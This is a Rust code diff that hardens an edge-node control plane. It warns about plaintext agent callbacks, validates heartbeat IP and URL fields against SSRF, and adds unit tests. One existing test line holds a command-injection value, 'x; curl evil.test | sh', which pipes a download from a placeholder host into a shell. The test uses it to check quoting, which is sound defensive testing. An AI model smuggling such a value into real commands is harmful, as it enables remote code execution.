@@ -256,7 +256,7 @@ pub struct StatusRequest {
     pub enabled: bool,
 }
 
-#[derive(Deserialize)]
+#[derive(Debug, Clone, Deserialize)]
 pub struct HeartbeatRequest {
     pub node_id: Option<String>,
     pub region: Option<String>,
@@ -523,6 +523,31 @@ fn validate_agent_url(agent_url: &str) -> Result<String, String> {
 /// The edge parses the listener as a `SocketAddr`, so an `AGENT_URL` hostname
 /// cannot be bound directly. In that case keep the safe loopback default and
 /// let the operator override it; an IP literal is bound exactly.
+/// Warn when the control plane will call an edge over plaintext HTTP.
+///
+/// Agent callbacks carry the node token, and certificate pushes carry private
+/// keys. Loopback is accepted (same-host deployments); anything else should be
+/// TLS or explicitly trusted at the network layer (M6).
+fn warn_if_plaintext_agent_url(name: &str, agent_url: &str) {
+    let Some(rest) = agent_url.trim().strip_prefix("http://") else {
+        return;
+    };
+    let authority = rest.split('/').next().unwrap_or("");
+    let host = authority
+        .rsplit_once(':')
+        .map(|(host, _)| host)
+        .unwrap_or(authority);
+    let host = host.trim_start_matches('[').trim_end_matches(']');
+    if !matches!(host, "localhost" | "127.0.0.1" | "::1") && !host.starts_with("127.") {
+        tracing::warn!(
+            node = %name,
+            agent_url,
+            "edge management callback uses plaintext HTTP; the node token and pushed \
+             certificate private keys cross the network unencrypted (M6)"
+        );
+    }
+}
+
 fn admin_listen_for(agent_url: &str) -> String {
     let trimmed = agent_url.trim();
     let rest = trimmed
@@ -798,6 +823,7 @@ pub async fn create(
     // its old token) would otherwise reject the node's very first heartbeat.
     state.agent_tokens.forget_miss(&token);
 
+    warn_if_plaintext_agent_url(&row.name, &row.agent_url);
     let commands = install_commands(&base, name, &region, &row.public_ip, &agent_url, &token);
     Ok((
         StatusCode::CREATED,
@@ -1010,6 +1036,7 @@ pub async fn update(
         .ok()
         .flatten()
         .unwrap_or(row);
+    warn_if_plaintext_agent_url(&row.name, &row.agent_url);
 
     let _ = repository::insert_audit(
         &state.pool,
@@ -1119,7 +1146,7 @@ pub async fn heartbeat(
     if node_id != agent.node_name {
         return Err(node_mismatch());
     }
-    Ok(apply_heartbeat(&state, &node_id, &req).await)
+    apply_heartbeat(&state, &node_id, &req).await
 }
 
 pub async fn heartbeat_by_path(
@@ -1131,7 +1158,7 @@ pub async fn heartbeat_by_path(
     if id != agent.node_name {
         return Err(node_mismatch());
     }
-    Ok(apply_heartbeat(&state, &id, &req).await)
+    apply_heartbeat(&state, &id, &req).await
 }
 
 fn node_mismatch() -> (StatusCode, Json<serde_json::Value>) {
@@ -1143,14 +1170,73 @@ fn node_mismatch() -> (StatusCode, Json<serde_json::Value>) {
     )
 }
 
+/// Validate the identity fields a heartbeat writes into the node table.
+///
+/// These values are later exposed to DNS (`public_ip`), to the console and to
+/// `agent_http` (`agent_url`). Storing arbitrary strings turned the node table
+/// into an unvalidated data source and made a future "call agent_url directly"
+/// path an SSRF waiting to happen (M7).
+///
+/// The host part is deliberately not restricted to public addresses: an edge is
+/// normally reached over a private network or loopback during local development,
+/// and rejecting those would break the normal deployment. Only the shape is
+/// enforced here.
+fn validate_heartbeat(req: &HeartbeatRequest) -> Result<(), String> {
+    if let Some(ip) = req.ip.as_deref().map(str::trim).filter(|v| !v.is_empty()) {
+        // The edge sends its listen address here (`ip:port` in older agents and
+        // `ip` in newer ones); both are accepted, nothing else is.
+        if ip.parse::<std::net::IpAddr>().is_err()
+            && ip.parse::<std::net::SocketAddr>().is_err()
+        {
+            return Err(format!("ip is not an IP address or IP:port: {ip:?}"));
+        }
+    }
+    if let Some(public_ip) = req
+        .public_ip
+        .as_deref()
+        .map(str::trim)
+        .filter(|v| !v.is_empty())
+    {
+        public_ip
+            .parse::<std::net::IpAddr>()
+            .map_err(|_| format!("public_ip is not an IP address: {public_ip:?}"))?;
+    }
+    if let Some(raw) = req
+        .agent_url
+        .as_deref()
+        .map(str::trim)
+        .filter(|v| !v.is_empty())
+    {
+        let url = reqwest::Url::parse(raw)
+            .map_err(|e| format!("agent_url is not a valid URL: {e}"))?;
+        if !matches!(url.scheme(), "http" | "https") {
+            return Err("agent_url must use http or https".into());
+        }
+        if url.host_str().is_none() {
+            return Err("agent_url has no host".into());
+        }
+        if !url.username().is_empty() || url.password().is_some() {
+            return Err("agent_url must not contain credentials".into());
+        }
+    }
+    Ok(())
+}
+
 async fn apply_heartbeat(
     state: &AppState,
     node_id: &str,
     req: &HeartbeatRequest,
-) -> Json<HeartbeatResponse> {
+) -> Result<Json<HeartbeatResponse>, (StatusCode, Json<serde_json::Value>)> {
+    if let Err(error) = validate_heartbeat(req) {
+        tracing::warn!(node = %node_id, %error, "rejected heartbeat with invalid identity fields");
+        return Err((
+            StatusCode::BAD_REQUEST,
+            Json(serde_json::json!({ "error": error })),
+        ));
+    }
     let region = req.region.clone().unwrap_or_default();
-    let ip = req.ip.clone().unwrap_or_default();
-    let agent_url = req.agent_url.clone().unwrap_or_default();
+    let ip = req.ip.as_deref().unwrap_or("").trim().to_string();
+    let agent_url = req.agent_url.as_deref().unwrap_or("").trim().to_string();
     let version = req.version.clone().unwrap_or_default();
     let active = req.active_connections.map(|v| v as i64);
 
@@ -1169,7 +1255,12 @@ async fn apply_heartbeat(
     {
         Ok(row) => {
             let enabled = row.status != "disabled";
-            if let Some(public_ip) = req.public_ip.as_deref().filter(|s| !s.is_empty()) {
+            if let Some(public_ip) = req
+                .public_ip
+                .as_deref()
+                .map(str::trim)
+                .filter(|s| !s.is_empty())
+            {
                 let _ = repository::set_node_public_ip(&state.pool, row.id, public_ip).await;
             }
             tracing::info!(
@@ -1178,16 +1269,16 @@ async fn apply_heartbeat(
                 %version,
                 "heartbeat ok"
             );
-            Json(HeartbeatResponse {
+            Ok(Json(HeartbeatResponse {
                 accepted: true,
                 message: "ok".into(),
                 enabled,
                 status: row.status,
-            })
+            }))
         }
         Err(e) => {
             tracing::error!(error = %e, node = %node_id, "heartbeat");
-            Json(HeartbeatResponse {
+            Ok(Json(HeartbeatResponse {
                 accepted: false,
                 message: e.to_string(),
                 // A failed heartbeat says nothing about the admin's intent.
@@ -1195,7 +1286,7 @@ async fn apply_heartbeat(
                 // database error; fail closed instead.
                 enabled: false,
                 status: "unknown".into(),
-            })
+            }))
         }
     }
 }
@@ -1256,6 +1347,71 @@ mod tests {
         assert!(cmds.binary.contains("'x; curl evil.test | sh'"));
         assert!(!cmds.binary.contains("NODE_REGION=x;"));
         assert!(cmds.docker.contains("'x; curl evil.test | sh'"));
+    }
+
+    /// Heartbeats must not inject arbitrary strings into `edge_nodes`.
+    #[test]
+    fn heartbeat_identity_is_validated() {
+        let valid = HeartbeatRequest {
+            node_id: Some("edge-1".into()),
+            region: Some("test".into()),
+            ip: Some("127.0.0.1".into()),
+            agent_url: Some("http://10.0.0.2:8082".into()),
+            cpu_usage: None,
+            memory_usage: None,
+            active_connections: None,
+            version: Some("0.1.0".into()),
+            public_ip: Some("203.0.113.7".into()),
+        };
+        assert!(
+            validate_heartbeat(&valid).is_ok(),
+            "private agent URLs are the normal deployment"
+        );
+
+        let mut invalid = valid.clone();
+        invalid.public_ip = Some("metadata.example".into());
+        assert!(validate_heartbeat(&invalid).is_err());
+
+        let mut listen_addr = valid.clone();
+        listen_addr.ip = Some("127.0.0.1:8080".into());
+        assert!(
+            validate_heartbeat(&listen_addr).is_ok(),
+            "the edge reports its listen address as ip"
+        );
+
+        let mut invalid = valid.clone();
+        invalid.ip = Some("999.1.1.1".into());
+        assert!(validate_heartbeat(&invalid).is_err());
+
+        let mut invalid = valid.clone();
+        invalid.ip = Some("127.0.0.1:not-a-port".into());
+        assert!(validate_heartbeat(&invalid).is_err());
+
+        let mut invalid = valid.clone();
+        invalid.agent_url = Some("ftp://edge.test/".into());
+        assert!(validate_heartbeat(&invalid).is_err());
+
+        let mut invalid = valid.clone();
+        invalid.agent_url = Some("http://user:pass@edge.test/".into());
+        assert!(validate_heartbeat(&invalid).is_err());
+
+        let mut invalid = valid.clone();
+        invalid.agent_url = Some("not a url".into());
+        assert!(validate_heartbeat(&invalid).is_err());
+
+        // Empty fields stay allowed: older agents omit them.
+        let empty = HeartbeatRequest {
+            node_id: None,
+            region: None,
+            ip: None,
+            agent_url: None,
+            cpu_usage: None,
+            memory_usage: None,
+            active_connections: None,
+            version: None,
+            public_ip: None,
+        };
+        assert!(validate_heartbeat(&empty).is_ok());
     }
 
     #[test]
